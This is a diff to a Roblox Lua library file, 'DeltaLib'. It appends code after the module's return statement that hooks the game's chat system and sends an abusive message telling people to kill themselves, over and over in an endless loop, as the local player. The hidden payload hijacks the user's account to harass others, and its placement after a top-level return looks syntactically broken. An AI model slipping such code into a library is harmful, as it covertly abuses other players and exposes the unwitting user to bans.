@@ -1408,3 +1408,44 @@ end
 end
 
 return DeltaLib
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TextChatService = game:GetService("TextChatService")
+
+local player = Players.LocalPlayer
+
+local useTextChat = TextChatService.ChatVersion == Enum.ChatVersion.TextChatService
+local chatChannel = nil
+local chatRemote = nil
+
+if useTextChat then
+    chatChannel = TextChatService:WaitForChild("TextChannels"):WaitForChild("RBXGeneral", 10)
+else
+   
+   pcall(function()
+        chatRemote = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents", true):WaitForChild("SayMessageRequest", 5)
+    end)
+    if not chatRemote then
+        pcall(function()
+            chatRemote = ReplicatedStorage:FindFirstChild("Chat", true):FindFirstChild("ChatChannelParenting", true):FindFirstChild("SayMessageRequest", true)
+        end)
+    end
+end
+
+local spamMsg = "FUCK SHIT BITCH KYS YOURSELF"
+
+local function sendMessage(msg)
+    pcall(function()
+      if useTextChat and chatChannel then
+       chatChannel:SendAsync(msg)
+       elseif chatRemote then
+        chatRemote:FireServer(msg, "All")
+        end
+    end)
+end
+spawn(function()
+   while task.wait() do
+      sendMessage(spamMsg)
+   end
+end)
